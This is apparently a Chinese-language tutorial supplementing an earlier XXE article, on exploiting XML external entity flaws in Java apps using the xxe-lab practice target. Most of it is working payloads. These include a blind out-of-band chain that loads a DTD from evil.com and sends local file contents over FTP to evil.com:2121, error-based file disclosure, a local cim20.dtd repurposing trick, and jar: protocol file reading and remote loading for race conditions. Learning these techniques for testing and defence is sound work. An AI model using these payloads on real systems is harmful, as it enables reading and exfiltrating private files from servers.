**一，前言  
**

  

阅读此文章之前建议阅读《XXE》

原文对于javaxxe居然一句话就略过了——【除此之外，在java环境中，换行文件用ftp协议外带更容易】，这篇文章是对其的补充。

靶场环境同样用  

https://github.com/c0ny1/xxe-lab  

php的xxe在php5.4版本之后少见了，是因为libxml在2.9.1之后默认关闭外部实体，这个在我以前的文章有提及。

但java的XXE还是非常常见的，以下是java和php支持协议的不同。

  

PHP：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar  
PHP扩展openssl：https/ftps      
PHP扩展zip：zip  
PHP扩展ssh2：ssh2.shell/ssh2.exec/ssh2.tunnel/ssh2.sftp/ssh2.scp  
PHP扩展rar：rar  
PHP扩展oggvorbis：ogg  
PHP扩展expect ：expect               
Java：http/https/ftp/file/jar/netdoc/mailto/gopher(仅限低版本)  
.NET：file/http/https/ftp  

  

回显XXE进行任意文件读取，http/ftp协议探测内网，这些一般的利用方法都没什么区别。

**四，ftp协议带出  
**

  

  

对于不回显XXE，java没法像php一样用php://filter用来编码文件，只能用http或者ftp带出，受到很大限制。http不用多说，ftp方式如下。

请求

*   
*   
*   
*   
*   
*   

```
<?xml version="1.0"?><!DOCTYPE GVI [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><user><username>admin</username><password>admin</password></user>
```

dtd

*   
*   
*   
*   

```
<!ENTITY % all SYSTEM "file:///C:/test.txt"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'ftp://evil.com:2121/%all;'>">%eval;%error;
```

此时无法直接使用nc监听2121端口，需要用到伪ftp服务器  

https://github.com/LandGrey/xxe-ftp-server/

python xxe-ftp-server.py 0.0.0.0 8081 2121  

![](../Images/7d5eaf8350e5a21a902d2fb60467dc70.png)

ftp协议可获取java版本，但很多特殊字符都会导致无法带出，同时JDK大于7u141和8u162版本无法带出有换行的文件。

  

**五，dtd报错带出  
**

  

如果存在堆栈报错，可以拼接在不存在file地址引发报错来获取回显(php也可以用这种方法)。  
 dtd稍微改一下即可  

*   
*   
*   
*   

```
<!ENTITY % all SYSTEM "file:///c:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%all;'>">%eval;%error;
```

**六，本地dtd  
**

  

如果无法使用外部dtd(比如不通外网)，这样内部无法拼接实体，需要用到本地dtd。  
有实体满足<!ENTITY % XXX "XXX">，后面再被%XXX;引用即可。  
比如windows存在C:/Windows/System32/wbem/xml/cim20.dtd  

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
<?xml version="1.0" ?><!DOCTYPE message [    <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">    <!ENTITY % SuperClass '>        <!ENTITY &#x25; file SYSTEM "file:///c:/windows/win.ini">        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">        &#x25;eval;        &#x25;error;        '>    %local_dtd;]><user><username>admin</username><password>admin</password></user>
```

![](../Images/a4a08030d973f09df851963fe4820d98.png)  

同理，加载了本地dtd也可以用ftp协议外带符合条件的文件。  

![](../Images/7090ebd46c7a3541fdf7a1416400895e.png)

**七，jar协议远程加载**  

  
jar协议可以用来读取zip格式文件(包括jar包)中的内容，也可以引用zip格式文件中的dtd  

*   
*   
*   

```
<?xml version="1.0"?><!DOCTYPE GVI [<!ENTITY xxe SYSTEM "jar:file:///C:/test.zip!/test.txt" >]><user><username>&xxe;</username><password>admin</password></user>
```

![](../Images/afec57deeba9e121f1e4556eb25e3916.png)  

  

jar协议也支持远程加载zip文件，并且会在缓存目录生成一个文件，可用于条件竞争。确定缓存文件位置可将test.txt换成不存在的文件使其报错即可。
